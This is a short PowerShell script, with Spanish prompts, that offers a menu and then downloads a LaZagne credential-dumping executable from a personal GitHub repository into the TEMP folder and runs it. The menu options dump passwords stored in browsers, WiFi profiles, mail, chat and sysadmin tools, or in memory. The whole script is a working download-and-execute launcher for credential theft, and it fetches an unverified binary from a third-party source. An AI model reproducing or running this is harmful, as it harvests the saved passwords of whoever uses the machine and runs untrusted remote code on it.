# lag.ps1 - Versión con menú
Write-Host "=== LaZagne Menu ===" -ForegroundColor Cyan
Write-Host "Selecciona opción:" -ForegroundColor Yellow
Write-Host "1. TODOS los módulos" -ForegroundColor Green
Write-Host "2. Solo navegadores" -ForegroundColor Green
Write-Host "3. WiFi passwords" -ForegroundColor Green
Write-Host "4. Sysadmin" -ForegroundColor Green
Write-Host "5. Personalizado" -ForegroundColor Green
Write-Host "6. Solo descargar" -ForegroundColor Gray

$choice = Read-Host "`nOpción [1-6]"

# URLs
$exeUrl = "https://github.com/kobasky17/lagzane.exe-for-windows/raw/refs/heads/master/laZagne.exe"
$exePath = "$env:TEMP\lz_$(Get-Random).exe"

# Descargar
Write-Host "`nDescargando..." -ForegroundColor Yellow
(New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)

# Seleccionar argumentos
$arguments = switch ($choice) {
    "1" { @("all", "-oN") }
    "2" { @("browsers", "-oN") }
    "3" { @("wifi", "-oN") }
    "4" { @("sysadmin", "-oN") }
    "5" { 
        Write-Host "`nMódulos disponibles: browsers, mails, chats, sysadmin, wifi, games, memory"
        $custom = Read-Host "Escribe módulo(s) separados por espacio"
        @($custom.Split(" "), "-oN")
    }
    "6" { 
        Write-Host "Ejecutable guardado en: $exePath" -ForegroundColor Green
        Write-Host "Usa: & '$exePath' [modulo]" -ForegroundColor Yellow
        exit 
    }
    default { @("all", "-oN") }
}

# Ejecutar
Write-Host "`nEjecutando LaZagne..." -ForegroundColor Cyan
Write-Host "Comando: $exePath $arguments" -ForegroundColor Gray

Start-Process -FilePath $exePath -ArgumentList $arguments -Wait -NoNewWindow

Write-Host "`n=== COMPLETADO ===" -ForegroundColor Green
pause